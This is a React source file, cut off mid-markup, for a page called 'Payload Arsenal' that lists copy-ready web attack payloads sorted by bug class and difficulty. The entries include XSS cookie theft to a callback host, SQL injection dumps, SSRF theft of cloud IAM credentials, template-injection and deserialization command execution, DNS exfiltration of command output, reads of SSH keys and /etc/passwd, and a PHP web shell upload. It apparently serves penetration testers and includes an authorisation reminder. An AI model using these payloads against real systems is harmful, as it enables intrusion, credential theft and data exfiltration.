"use client";

import { useMemo, useState } from "react";
import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
import { faCheck, faCopy } from "@fortawesome/free-solid-svg-icons";
import { useCopy } from "@/lib/mdx-ui";
import ToolHelp from "@/components/tools/ToolHelp";
import { useLocalState } from "@/lib/useLocalState";
import { TYPOGRAPHY } from "@/lib/design-tokens";

type Level = "basic" | "intermediate" | "advanced" | "bypass";

interface Payload {
  name: string;
  level: Level;
  code: string;
  note: string;
}

interface Subtype {
  id: string;
  label: string;
  payloads: Payload[];
}

interface Category {
  id: string;
  label: string;
  color: string;
  blurb: string;
  subtypes: Subtype[];
}

const LEVEL_COLOR: Record<Level, string> = {
  basic: "#00dd44",
  intermediate: "#ffdd00",
  advanced: "#ff5500",
  bypass: "#ff2d95",
};

const LEVELS: Level[] = ["basic", "intermediate", "advanced", "bypass"];

const ARSENAL: Category[] = [
  {
    id: "xss",
    label: "XSS",
    color: "#ffdd00",
    blurb: "Cross-site scripting runs your JavaScript in someone else's session. Reflected needs a click, stored fires for every viewer, DOM lives in client-side code, blind lands in a panel you never see.",
    subtypes: [
      {
        id: "reflected",
        label: "Reflected",
        payloads: [
          { name: "Classic script tag", level: "basic", code: "<script>alert(1)</script>", note: "The baseline. If this renders, the parameter is not encoded." },
          { name: "Broken attribute escape", level: "basic", code: "\"><script>alert(1)</script>", note: "Closes an attribute first, for when your input lands inside one." },
          { name: "Textarea / title escape", level: "intermediate", code: "</textarea><svg onload=alert(1)>", note: "Use when your input is echoed inside a textarea or title element." },
        ],
      },
      {
        id: "stored",
        label: "Stored",
        payloads: [
          { name: "Image onerror", level: "basic", code: "<img src=x onerror=alert(1)>", note: "Fires whenever the stored value is rendered. Good for comment fields." },
          { name: "SVG onload", level: "basic", code: "<svg onload=alert(1)>", note: "Survives sanitisers that only strip <script>." },
          { name: "Details ontoggle", level: "intermediate", code: "<details open ontoggle=alert(1)>", note: "No user interaction needed in most browsers." },
          { name: "Session theft", level: "advanced", code: "<script>new Image().src='https://{{callback}}/?c='+encodeURIComponent(document.cookie)</script>", note: "Only works when the cookie is not HttpOnly. Check that first." },
        ],
      },
      {
        id: "dom",
        label: "DOM",
        payloads: [
          { name: "Hash sink", level: "basic", code: "#<img src=x onerror=alert(1)>", note: "For pages that write location.hash into innerHTML." },
          { name: "javascript: link", level: "intermediate", code: "javascript:alert(document.domain)", note: "Test wherever user input becomes an href." },
          { name: "Source to sink hunt", level: "advanced", code: "?q=<img src=x onerror=alert(1)>", note: "Trace data from a source (URL, storage, postMessage) into a sink (innerHTML, eval, document.write)." },
        ],
      },
      {
        id: "blind",
        label: "Blind",
        payloads: [
          { name: "Out-of-band callback", level: "advanced", code: "<script src=https://{{callback}}/x.js></script>", note: "Fires when an admin opens the page. Watch your collaborator." },
          { name: "CSP-friendly fetch", level: "advanced", code: "<img src=x onerror=\"fetch('https://{{callback}}/'+document.domain)\">", note: "Use when inline script is blocked but image errors are not." },
        ],
      },
      {
        id: "bypass",
        label: "Filter bypass",
        payloads: [
          { name: "Case mix", level: "bypass", code: "<ScRiPt>alert(1)</ScRiPt>", note: "Defeats naive lowercase blacklists." },
          { name: "No parentheses", level: "bypass", code: "<svg onload=alert`1`>", note: "Template-literal call, when ( and ) are filtered." },
          { name: "Polyglot", level: "bypass", code: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e", note: "Works in HTML, attribute and JavaScript contexts without knowing which one you are in." },
          { name: "Mutation XSS seed", level: "bypass", code: "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">", note: "The browser re-parses the sanitised output and the payload reassembles." },
        ],
      },
    ],
  },
  {
    id: "sqli",
    label: "SQL Injection",
    color: "#0055ff",
    blurb: "Injection turns your input into part of a query. Start with a single quote to break the syntax, then work out whether errors, the result set, timing or a boolean difference is your channel.",
    subtypes: [
      {
        id: "auth",
        label: "Auth bypass",
        payloads: [
          { name: "Classic OR", level: "basic", code: "admin' OR '1'='1' -- -", note: "Comment out the rest of the query so the password check disappears." },
          { name: "Always true, no comment", level: "basic", code: "admin' OR 1=1 LIMIT 1 -- -", note: "Use when the app appends more SQL after your input." },
          { name: "Login as anyone", level: "intermediate", code: "admin'-- -", note: "Works when the password is checked after the username lookup." },
        ],
      },
      {
        id: "union",
        label: "UNION",
        payloads: [
          { name: "Find the column count", level: "basic", code: "' ORDER BY 5-- -", note: "Increase until it errors — the last working number is the count." },
          { name: "Union probe", level: "basic", code: "' UNION SELECT 1,2,3,4,5-- -", note: "The numbers show which columns are reflected on the page." },
          { name: "Dump the database name", level: "intermediate", code: "' UNION SELECT 1,database(),3,4,5-- -", note: "Then enumerate tables from information_schema." },
          { name: "MySQL table dump", level: "intermediate", code: "' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables-- -", note: "Filter with table_schema = database() to skip system tables." },
        ],
      },
      {
        id: "blind",
        label: "Blind (boolean + time)",
        payloads: [
          { name: "Boolean check", level: "intermediate", code: "' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'-- -", note: "The page differs by content, not by error. Automate the character loop." },
          { name: "MySQL time delay", level: "intermediate", code: "' AND IF(1=1,SLEEP(3),0)-- -", note: "When nothing is reflected, timing still talks." },
          { name: "PostgreSQL time delay", level: "intermediate", code: "'; SELECT pg_sleep(3)-- -", note: "Needs stacked queries." },
          { name: "MSSQL time delay", level: "intermediate", code: "'; WAITFOR DELAY '0:0:3'-- -", note: "SQL Server equivalent." },
        ],
      },
      {
        id: "advanced",
        label: "Advanced / OOB",
        payloads: [
          { name: "MSSQL out-of-band", level: "advanced", code: "'; EXEC master..xp_dirtree '\\\\{{callback}}\\a'-- -", note: "Forces a DNS lookup you can see in your collaborator." },
          { name: "MySQL file read", level: "advanced", code: "' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -", note: "Requires FILE privilege and a readable path." },
          { name: "WAF bypass with comments", level: "bypass", code: "'/**/UNION/**/SELECT/**/1,2,3-- -", note: "Inline comments break up the keywords a WAF matches on." },
        ],
      },
      {
        id: "nosql",
        label: "NoSQL",
        payloads: [
          { name: "Mongo operator", level: "intermediate", code: "{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}", note: "JSON body injection: $ne matches anything that exists." },
          { name: "Regex brute", level: "advanced", code: "{\"username\":\"admin\",\"password\":{\"$regex\":\"^a\"}}", note: "Test one character at a time through the response difference." },
        ],
      },
    ],
  },
  {
    id: "ssrf",
    label: "SSRF",
    color: "#00e5ff",
    blurb: "Server-side request forgery makes the server fetch a URL for you — ideal for reaching internal services and cloud metadata the internet cannot touch.",
    subtypes: [
      {
        id: "internal",
        label: "Internal services",
        payloads: [
          { name: "Localhost", level: "basic", code: "http://127.0.0.1:8080/admin", note: "The server trusts itself more than it trusts you." },
          { name: "Decimal IP", level: "bypass", code: "http://2130706433:8080/admin", note: "127.0.0.1 as one integer, bypassing naive localhost blacklists." },
          { name: "IPv6 loopback", level: "bypass", code: "http://[::1]:8080/", note: "Another localhost spelling filters often miss." },
        ],
      },
      {
        id: "cloud",
        label: "Cloud metadata",
        payloads: [
          { name: "AWS IMDSv1", level: "advanced", code: "http://169.254.169.254/latest/meta-data/iam/security-credentials/", note: "Steals temporary IAM credentials when IMDSv2 is not enforced." },
          { name: "GCP metadata", level: "advanced", code: "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", note: "Needs a Metadata-Flavor: Google header — where SSRF header injection helps." },
          { name: "Azure IMDS", level: "advanced", code: "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", note: "Requires Metadata: true." },
        ],
      },
      {
        id: "bypass",
        label: "Filter bypass",
        payloads: [
          { name: "Redirect chain", level: "bypass", code: "http://yourhost/redirect?url=http://169.254.169.254/", note: "Pass the filter on a domain you own, then bounce to the target." },
          { name: "DNS rebinding", level: "advanced", code: "http://rebind.attacker.tld/", note: "Resolves safely during validation, then to 127.0.0.1." },
          { name: "Gopher for raw TCP", level: "advanced", code: "gopher://127.0.0.1:6379/_SET%20pwn%20hi%0D%0A", note: "Speaks raw protocols like Redis or SMTP through a URL fetcher." },
        ],
      },
    ],
  },
  {
    id: "ssti",
    label: "SSTI",
    color: "#8800ff",
    blurb: "Server-side template injection happens when input is concatenated into a template. A little maths identifies the engine; from there it is usually straight to command execution.",
    subtypes: [
      {
        id: "detect",
        label: "Detection",
        payloads: [
          { name: "Universal probe", level: "basic", code: "{{7*7}} ${7*7} #{7*7} <%= 7*7 %>", note: "Send all at once and see which returns 49." },
          { name: "Jinja2 vs Twig", level: "basic", code: "{{7*'7'}}", note: "7777777 in Jinja2 (Python), 49 in Twig (PHP)." },
        ],
      },
      {
        id: "exploit",
        label: "Exploitation",
        payloads: [
          { name: "Jinja2 RCE", level: "advanced", code: "{{ cycler.__init__.__globals__.os.popen('id').read() }}", note: "Python/Jinja2. Only on authorised targets." },
          { name: "Twig RCE", level: "advanced", code: "{{['id']|filter('system')}}", note: "PHP/Twig." },
          { name: "Freemarker RCE", level: "advanced", code: "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}", note: "Java/Freemarker." },
          { name: "Velocity RCE", level: "advanced", code: "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))", note: "Java/Velocity: build the Runtime call from the class loader." },
        ],
      },
    ],
  },
  {
    id: "cmdi",
    label: "Command Injection",
    color: "#ff5500",
    blurb: "When input reaches a shell, separators chain your command onto theirs. If output is hidden, make the server call you instead.",
    subtypes: [
      {
        id: "basic",
        label: "Direct",
        payloads: [
          { name: "Semicolon", level: "basic", code: "1; id", note: "Run the original command, then yours." },
          { name: "Pipe", level: "basic", code: "1 | id", note: "Feed the output into your command." },
          { name: "Backticks", level: "intermediate", code: "1 `id`", note: "Substitution, useful inside quoted arguments." },
          { name: "Newline", level: "intermediate", code: "1%0aid", note: "Use when ; and | are filtered." },
        ],
      },
      {
        id: "blind",
        label: "Blind / OOB",
        payloads: [
          { name: "Time delay", level: "intermediate", code: "1; sleep 5", note: "A five second pause proves execution." },
          { name: "DNS callback", level: "advanced", code: "1; nslookup {{callback}}", note: "Works even when all output is discarded." },
          { name: "Exfil via subdomain", level: "advanced", code: "1; nslookup $(whoami).{{callback}}", note: "Sends the command result to you as a DNS label." },
        ],
      },
      {
        id: "bypass",
        label: "Filter bypass",
        payloads: [
          { name: "Space bypass", level: "bypass", code: "1;{cat,/etc/passwd}", note: "Brace expansion removes the need for spaces." },
          { name: "Keyword splicing", level: "bypass", code: "1;c\\at /etc/passwd", note: "A backslash breaks up filtered keywords." },
          { name: "Base64 pipe", level: "bypass", code: "1; echo aWQ= | base64 -d | sh", note: "Encoded command defeats keyword filters." },
        ],
      },
    ],
  },
  {
    id: "lfi",
    label: "LFI / Traversal",
    color: "#ff2d95",
    blurb: "Path traversal reads files the app did not mean to serve. File inclusion goes further: PHP wrappers turn a read into source disclosure or code execution.",
    subtypes: [
      {
        id: "read",
        label: "File read",
        payloads: [
          { name: "Linux passwd", level: "basic", code: "../../../../etc/passwd", note: "Count directories until it resolves." },
          { name: "Windows equivalent", level: "basic", code: "..\\..\\..\\..\\windows\\win.ini", note: "Same idea with backslashes." },
          { name: "Double encoding", level: "bypass", code: "%252e%252e%252f%252e%252e%252fetc%252fpasswd", note: "For filters that decode only once." },
          { name: "Null byte (legacy PHP)", level: "bypass", code: "../../../etc/passwd%00", note: "Truncates an appended extension on old PHP." },
        ],
      },
      {
        id: "php",
        label: "PHP wrappers",
        payloads: [
          { name: "Source disclosure", level: "advanced", code: "php://filter/convert.base64-encode/resource=index.php", note: "Reads PHP source instead of executing it." },
          { name: "Log poisoning", level: "advanced", code: "../../../../var/log/apache2/access.log", note: "Put PHP in your User-Agent, then include the log to run it." },
          { name: "Input wrapper", level: "advanced", code: "php://input", note: "Needs allow_url_include=On and a POST body with PHP." },
        ],
      },
      {
        id: "tricks",
        label: "Other targets",
        payloads: [
          { name: "Process environment", level: "intermediate", code: "../../../../proc/self/environ", note: "Sometimes holds secrets or injectable values." },
          { name: "SSH private key", level: "intermediate", code: "../../../../home/user/.ssh/id_rsa", note: "A read that is often game over." },
        ],
      },
    ],
  },
  {
    id: "xxe",
    label: "XXE",
    color: "#00dd44",
    blurb: "XML external entities make a parser fetch things for you — local files, internal services, or a URL of your choosing. Confirm the endpoint accepts XML first.",
    subtypes: [
      {
        id: "file",
        label: "File read",
        payloads: [
          { name: "Classic file read", level: "basic", code: "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>", note: "Reflected in the response when the app echoes parsed values." },
          { name: "PHP filter", level: "advanced", code: "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\">]><foo>&xxe;</foo>", note: "Base64 avoids XML-breaking characters in the file." },
        ],
      },
      {
        id: "blind",
        label: "Blind / OOB",
        payloads: [
          { name: "External DTD exfil", level: "advanced", code: "<!DOCTYPE foo [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % dtd SYSTEM \"https://{{callback}}/evil.dtd\">%dtd;]>", note: "The remote DTD builds a request that carries the file contents to you." },
          { name: "SSRF via XXE", level: "advanced", code: "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>", note: "Pairs XXE with cloud metadata theft." },
        ],
      },
      {
        id: "vectors",
        label: "Hidden vectors",
        payloads: [
          { name: "SVG upload", level: "advanced", code: "<svg xmlns=\"http://www.w3.org/2000/svg\"><text>&xxe;</text></svg>", note: "Image pipelines parse XML too." },
          { name: "DOCX / XLSX", level: "advanced", code: "unzip file.docx  # edit word/document.xml", note: "Office files are zipped XML. Inject the DOCTYPE inside." },
        ],
      },
    ],
  },
  {
    id: "redirect",
    label: "Open Redirect",
    color: "#ff1144",
    blurb: "Open redirects look harmless until they are chained — OAuth code theft, phishing from a trusted domain, and SSRF filter bypass all start here.",
    subtypes: [
      {
        id: "basic",
        label: "Basic",
        payloads: [
          { name: "Absolute URL", level: "basic", code: "?next=https://evil.tld", note: "The simplest form: a parameter that accepts a full URL." },
          { name: "Protocol relative", level: "intermediate", code: "//evil.tld", note: "Inherits the current scheme." },
          { name: "Userinfo trick", level: "bypass", code: "https://trusted.tld@evil.tld", note: "Everything before the @ is userinfo, not the host." },
        ],
      },
      {
        id: "bypass",
        label: "Whitelist bypass",
        payloads: [
          { name: "Subdomain trust abuse", level: "bypass", code: "https://trusted.tld.evil.tld", note: "Defeats contains() checks that should be endsWith() on the host." },
          { name: "Backslash confusion", level: "bypass", code: "https://evil.tld\\@trusted.tld", note: "Different parsers disagree about where the host ends." },
          { name: "javascript scheme", level: "bypass", code: "javascript:alert(document.domain)", note: "Redirects straight into XSS where allowed." },
        ],
      },
    ],
  },
  {
    id: "auth",
    label: "Auth / JWT",
    color: "#8800ff",
    blurb: "Token attacks target trust between services. Decode, then test the three classics: trust the algorithm, trust the key id, and trust an unverified signature.",
    subtypes: [
      {
        id: "jwt",
        label: "JWT",
        payloads: [
          { name: "alg none", level: "basic", code: "{\"alg\":\"none\",\"typ\":\"JWT\"}", note: "Re-encode the header with alg none and drop the signature. Old libraries accepted it." },
          { name: "RS256 to HS256", level: "advanced", code: "# sign the token using the public key as the HMAC secret", note: "Works when the server accepts both families and does not pin the expected one." },
          { name: "kid path traversal", level: "advanced", code: "{\"alg\":\"HS256\",\"kid\":\"../../../../dev/null\"}", note: "If kid becomes a file path, point the key at a file you know." },
          { name: "Weak HMAC secret", level: "intermediate", code: "hashcat -m 16500 token.txt wordlist.txt", note: "Crack the secret offline, then mint your own tokens." },
        ],
      },
      {
        id: "session",
        label: "Session",
        payloads: [
          { name: "Predictable token", level: "intermediate", code: "collect 100 tokens and compare", note: "Timestamps, counters and base64 user ids show up often." },
          { name: "Password reset poisoning", level: "advanced", code: "Host: evil.tld", note: "The reset link is built from the Host header you control." },
        ],
      },
    ],
  },
  {
    id: "upload",
    label: "File Upload",
    color: "#00e5ff",
    blurb: "Uploads get dangerous when the server trusts the filename, the Content-Type, or the first bytes. Each payload beats a different check.",
    subtypes: [
      {
        id: "extension",
        label: "Extension tricks",
        payloads: [
          { name: "Double extension", level: "basic", code: "shell.php.jpg", note: "Apache with AddHandler may still execute the .php part." },
          { name: "Alternate PHP extensions", level: "intermediate", code: "shell.phtml  shell.pht  shell.php5", note: "Often overlooked in server config." },
          { name: "Null byte (legacy)", level: "bypass", code: "shell.php%00.jpg", note: "C-style string handling truncates at the null." },
        ],
      },
      {
        id: "content",
        label: "Content checks",
        payloads: [
          { name: "Magic bytes + code", level: "bypass", code: "GIF89a; <?php system($_GET['c']); ?>", note: "Starts with a valid GIF header, then contains PHP." },
          { name: "Content-Type spoof", level: "basic", code: "Content-Type: image/png", note: "Defeats checks that only read the declared type." },
          { name: "SVG with script", level: "advanced", code: "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(document.domain)\">", note: "Stored XSS served from your own domain." },
        ],
      },
    ],
  },
  {
    id: "cors",
    label: "CORS & Headers",
    color: "#00dd44",
    blurb: "Small header mistakes leak whole responses. Origin reflection plus credentials is a data breach you can read with JavaScript.",
    subtypes: [
      {
        id: "cors",
        label: "CORS",
        payloads: [
          { name: "Origin reflection", level: "basic", code: "Origin: https://evil.tld", note: "If it comes back in Access-Control-Allow-Origin with credentials, any site can read the response." },
          { name: "Null origin", level: "intermediate", code: "Origin: null", note: "Sandboxed iframes send null — check whether it is allowed." },
          { name: "Subdomain trust", level: "advanced", code: "Origin: https://anything.target.tld", note: "One XSS on any subdomain becomes a cross-origin read of the main app." },
        ],
      },
      {
        id: "crlf",
        label: "CRLF / header injection",
        payloads: [
          { name: "Response splitting", level: "intermediate", code: "%0d%0aSet-Cookie: pwned=1", note: "Injects a header when input is reflected into response headers." },
          { name: "Unicode CRLF", level: "bypass", code: "%E5%98%8A%E5%98%8D", note: "For filters that only strip %0d%0a." },
        ],
      },
    ],
  },
  {
    id: "modern",
    label: "Modern Web",
    color: "#ff5500",
    blurb: "The newer edges: GraphQL, prototype pollution, cache poisoning and deserialization. This is where the interesting bounties still live.",
    subtypes: [
      {
        id: "graphql",
        label: "GraphQL",
        payloads: [
          { name: "Introspection", level: "basic", code: "{__schema{types{name fields{name}}}}", note: "Dumps the schema when introspection is left on." },
          { name: "Node IDOR", level: "intermediate", code: "{node(id:\"VXNlcjox\"){...on User{email}}}", note: "Global ids decode to type and id — iterate them." },
          { name: "Alias batching", level: "advanced", code: "{a:login(u:\"admin\",p:\"a\"){token}}\n{b:login(u:\"admin\",p:\"b\"){token}}", note: "Bypasses rate limits by batching attempts in one request." },
        ],
      },
      {
        id: "proto",
        label: "Prototype pollution",
        payloads: [
          { name: "Query string", level: "intermediate", code: "?__proto__[isAdmin]=true", note: "Works when a query parser merges into a plain object." },
          { name: "JSON body", level: "intermediate", code: "{\"__proto__\":{\"isAdmin\":true}}", note: "Deep-merge helpers are the usual culprit." },
          { name: "Constructor route", level: "bypass", code: "?constructor[prototype][isAdmin]=true", note: "For when __proto__ is filtered." },
        ],
      },
      {
        id: "cache",
        label: "Cache poisoning",
        payloads: [
          { name: "Unkeyed header", level: "advanced", code: "X-Forwarded-Host: evil.tld", note: "If the response is cached and the header is unkeyed, every visitor gets your value." },
          { name: "Parameter cloaking", level: "advanced", code: "?utm=1&utm=2", note: "Parser differences between cache and origin hide the payload from the key." },
        ],
      },
      {
        id: "deser",
        label: "Serialization",
        payloads: [
          { name: "Python pickle", level: "advanced", code: "cos\\nsystem\\n(S'id'\\ntR.", note: "A pickle executes on load. Never unpickle untrusted data." },
          { name: "Java ysoserial", level: "advanced", code: "java -jar ysoserial.jar CommonsCollections6 'id' | base64", note: "Builds a gadget chain for the target classpath." },
          { name: "Node node-serialize", level: "advanced", code: "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()\"}", note: "The classic node-serialize IIFE payload." },
        ],
      },
    ],
  },
];

const VARIABLES = [
  { key: "{{target}}", label: "target", fallback: "https://target.tld" },
  { key: "{{callback}}", label: "callback", fallback: "your-collab.tld" },
  { key: "{{port}}", label: "port", fallback: "4444" },
];

export default function PayloadArsenal() {
  const [categoryId, setCategoryId] = useLocalState("arsenal-category", ARSENAL[0].id);
  const [subtypeId, setSubtypeId] = useState("all");
  const [level, setLevel] = useState<Level | "all">("all");
  const [search, setSearch] = useState("");
  const [variables, setVariables] = useLocalState<Record<string, string>>("arsenal-variables", {});
  const { copied, copy } = useCopy();

  const category = ARSENAL.find((item) => item.id === categoryId) ?? ARSENAL[0];
  const totalPayloads = ARSENAL.reduce((sum, item) => sum + item.subtypes.reduce((s, sub) => s + sub.payloads.length, 0), 0);

  const apply = (code: string) =>
    VARIABLES.reduce((acc, variable) => acc.replaceAll(variable.key, variables[variable.key] || variable.fallback), code);

  const visible = useMemo(() => {
    const query = search.trim().toLowerCase();
    return category.subtypes
      .filter((subtype) => subtypeId === "all" || subtype.id === subtypeId)
      .map((subtype) => ({
        subtype,
        payloads: subtype.payloads.filter((payload) => {
          const levelOk = level === "all" || payload.level === level;
          const searchOk =
            !query ||
            payload.name.toLowerCase().includes(query) ||
            payload.code.toLowerCase().includes(query) ||
            payload.note.toLowerCase().includes(query);
          return levelOk && searchOk;
        }),
      }))
      .filter((group) => group.payloads.length > 0);
  }, [category, subtypeId, level, search]);

  const shown = visible.reduce((sum, group) => sum + group.payloads.length, 0);
  const mono = { fontFamily: TYPOGRAPHY.fontMono };

  return (
    <>
      <main className="min-h-screen flex-1 pt-16" style={{ backgroundColor: "var(--surf)" }}>
        <section className="mx-auto max-w-6xl px-6 py-16 md:px-12">
          <div className="mb-8 flex flex-wrap items-center gap-4">
            <h1 className="font-display text-3xl font-extrabold uppercase md:text-5xl" style={{ fontFamily: TYPOGRAPHY.fontDisplay, color: "var(--fg)" }}>
              Payload Arsenal
            </h1>
            <div className="h-1 flex-1" style={{ backgroundColor: "var(--fg)" }} />
            <span className="font-mono text-xs uppercase" style={{ ...mono, letterSpacing: TYPOGRAPHY.tracking.label, color: "var(--fg-muted)" }}>
              {totalPayloads} payloads
            </span>
          </div>

          <p className="mb-2 font-sans text-sm leading-relaxed text-fg" style={{ fontFamily: TYPOGRAPHY.fontSans }}>
            A working arsenal for web and API testing, sorted by bug class and difficulty. Every entry says what it does and when to reach for it.
          </p>

          <ToolHelp
            intro="Payloads are only half the skill — knowing which to try, and why, is the other half. Start with the basic entry to prove the bug exists, then move to the bypass variants once a filter or WAF pushes back."
            steps={[
              "Pick a bug class on the left (dropdown on mobile).",
              "Narrow by subtype and difficulty, or search a keyword like time or metadata.",
              "Fill in target, callback and port once — every payload updates.",
              "Copy, send, read the response. Basic first, bypass last.",
            ]}
            terms={[
              { term: "Basic", meaning: "Proves the bug with nothing in the way. Try this first." },
              { term: "Intermediate", meaning: "Needs a helper: a timing channel, a boolean check, or a wrapper." },
              { term: "Advanced", meaning: "Out-of-band, chained, or dependent on server configuration." },
              { term: "Bypass", meaning: "Same outcome, rewritten to slip past a blacklist, WAF or parser." },
              { term: "Callback", meaning: "A domain you control (Burp Collaborator, interactsh). Watch it for DNS and HTTP hits." },
              { term: "Out-of-band (OOB)", meaning: "The result never appears in the response, so you make the server call you." },
            ]}
            notes={[
              "Only test systems you are authorised to test — a scope document or a bug bounty policy.",
              "If a basic payload works, stop. Bypass variants are for when something blocks you.",
              "URL-encode, double-encode or base64 a payload when a filter eats it — that is often the whole trick.",
              "Record the exact request that worked. A reproduction beats a screenshot.",
            ]}
          />

          <div className="my-6 border-2 border-fg p-4" style={{ backgroundColor: "var(--surf)" }}>
            <span className="font-mono text-2xs uppercase text-fg-muted" style={{ ...mono, letterSpacing: TYPOGRAPHY.tracking.label }}>
              Variables
            </span>
            <div className="mt-3 grid grid-cols-1 gap-3 sm:grid-cols-3">
              {VARIABLES.map((variable) => (
                <label key={variable.key} className="block">
                  <span className="mb-1 block font-mono text-2xs uppercase text-fg-muted" style={mono}>
                    {variable.label}
                  </span>
                  <input
                    value={variables[variable.key] ?? ""}
                    onChange={(event) => setVariables((prev) => ({ ...prev, [variable.key]: event.target.value }))}
                    placeholder={variable.fallback}
                    spellCheck={false}
                    className="w-full border-2 border-fg bg-surface px-2 py-1.5 font-mono text-xs text-fg focus:outline-none"
                    style={mono}
                  />
                </label>
              ))}
            </div>
          </div>

          <div className="lg:grid lg:grid-cols-[220px_minmax(0,1fr)] lg:gap-6">
            <aside className="mb-4 lg:mb-0">
              <select
                value={categoryId}
                onChange={(event) => {
                  setCategoryId(event.target.value);
                  setSubtypeId("all");
                }}
                aria-label="Bug class"
                className="mb-3 w-full border-2 border-fg bg-surface px-3 py-2 font-mono text-sm uppercase text-fg focus:outline-none lg:hidden"
                style={mono}
              >
                {ARSENAL.map((item) => (
                  <option key={item.id} value={item.id}>
                    {item.label}
                  </option>
                ))}
              </select>

              <div className="hidden lg:sticky lg:top-24 lg:block">
                <span className="mb-2 block font-mono text-2xs uppercase text-fg-muted" style={{ ...mono, letterSpacing: TYPOGRAPHY.tracking.label }}>
                  Bug class
                </span>
                <div className="space-y-1">
                  {ARSENAL.map((item) => {
                    const active = item.id === categoryId;
                    return (
                      <button
                        key={item.id}
                        type="button"
                        onClick={() => {
                          setCategoryId(item.id);
                          setSubtypeId("all");
                        }}
                        aria-pressed={active}
                        className={`flex w-full cursor-pointer items-center gap-2 border-l-2 px-2.5 py-2 text-left transition-colors ${active ? "bg-fg/[0.06]" : "hover:bg-fg/[0.03]"}`}
                        style={{ borderLeftColor: active ? item.color : "transparent" }}
                      >
                        <span className="h-2 w-2 shrink-0" style={{ backgroundColor: item.color }} />
                        <span className="font-mono text-2xs uppercase" style={{ ...mono, color: active ? item.color : "var(--fg-muted)" }}>
                          {item.label}
                        </span>
                      </button>
                    );
                  })}
                </div>
              </div>
            </aside>

            <div className="min-w-0">
              <p className="mb-4 border-l-4 pl-3 font-sans text-sm leading-relaxed text-fg-muted" style={{ fontFamily: TYPOGRAPHY.fontSans, borderLeftColor: category.color }}>
                {category.blurb}
              </p>

              <div className="mb-3 flex flex-wrap gap-1.5">
                <button
                  type="button"
                  onClick={() => setSubtypeId("all")}
                  aria-pressed={subtypeId === "all"}
                  className={`cursor-pointer border-2 px-2.5 py-1 font-mono text-2xs uppercase transition-colors ${subtypeId === "all" ? "border-fg bg-fg text-surface" : "border-fg-muted/40 text-fg-muted hover:border-fg hover:text-fg"}`}
                  style={mono}
                >
                  all
                </button>
                {category.subtypes.map((subtype) => {
                  const active = subtype.id === subtypeId;
                  return (
                    <button
                      key={subtype.id}
                      type="button"
                      onClick={() => setSubtypeId(subtype.id)}
                      aria-pressed={active}
                      className={`cursor-pointer border-2 px-2.5 py-1 font-mono text-2xs uppercase transition-colors ${active ? "border-fg bg-fg text-surface" : "border-fg-muted/40 text-fg-muted hover:border-fg hover:text-fg"}`}
                      style={mono}
                    >
                      {subtype.label}
                    </button>
                  );
                })}
              </div>

              <div className="mb-5 flex flex-wrap items-center gap-2">
                <button
                  type="button"
                  onClick={() => setLevel("all")}
                  aria-pressed={level === "all"}
                  className={`cursor-pointer border px-2 py-0.5 font-mono text-2xs uppercase transition-colors ${level === "all" ? "border-fg bg-fg text-surface" : "border-fg-muted/40 text-fg-muted hover:border-fg hover:text-fg"}`}
                  style={mono}
                >
                  any level
                </button>
                {LEVELS.map((item) => {
                  const active = level === item;
                  return (
                    <button
                      key={item}
                      type="button"
                      onClick={() => setLevel(item)}
                      aria-pressed={active}
                      className={`cursor-pointer border px-2 py-0.5 font-mono text-2xs uppercase transition-colors ${active ? "border-fg bg-fg text-surface" : "text-fg-muted hover:text-fg"}`}
                      style={{ ...mono, borderColor: active ? undefined : LEVEL_COLOR[item] }}
                    >
                      <span className="mr-1 inline-block h-1.5 w-1.5 align-middle" style={{ backgroundColor: LEVEL_COLOR[item] }} />
                      {item}
                    </button>
                  );
                })}
                <input
                  value={search}
                  onChange={(event) => setSearch(event.target.value)}
                  placeholder="search payloads..."
                  spellCheck={false}
                  className="min-w-0 flex-1 basis-40 border-2 border-fg bg-surface px-2 py-1 font-mono text-xs text-fg focus:outline-none"
                  style={mono}
                />
                <span className="font-mono text-2xs uppercase text-fg-muted" style={mono}>
                  {shown} shown
                </span>
              </div>

              {shown === 0 && (
                <div className="border-2 border-fg-muted/30 p-6 text-center font-mono text-xs uppercase text-fg-muted" style={mono}>
                  nothing matches that filter
                </div>
              )}

              <div className="space-y-6">
                {visible.map(({ subtype, payloads }) => (
                  <div key={subtype.id}>
                    <div className="mb-2 flex items-center gap-2">
                      <span className="font-mono text-2xs uppercase" style={{ ...mono, color: category.color, letterSpacing: TYPOGRAPHY.tracking.label }}>
                        {subtype.label}
                      </span>
                      <span className="h-px flex-1" style={{ backgroundColor: "color-mix(in srgb, var(--fg) 15%, transparent)" }} />
                    </div>
                    <div className="space-y-3">
                      {payloads.map((payload) => (
                        <div key={payload.name} className="border-2 border-fg bg-surface">
                          <div className="flex flex-wrap items-center gap-2 border-b-2 border-fg px-3 py-2">
                            <span className="min-w-0 flex-1 font-display text-sm font-bold uppercase text-fg" style={{ fontFamily: TYPOGRAPHY.fontDisplay }}>
                              {payload.name}
                            </span>
                            <span className="border px-1.5 py-0.5 font-mono text-2xs uppercase" style={{ ...mono, borderColor: LEVEL_COLOR[payload.level], color: LEVEL_COLOR[payload.level] }}>
                              {payload.level}
                            </span>
                            <button
                              type="button"
                              onClick={() => copy(apply(payload.code))}
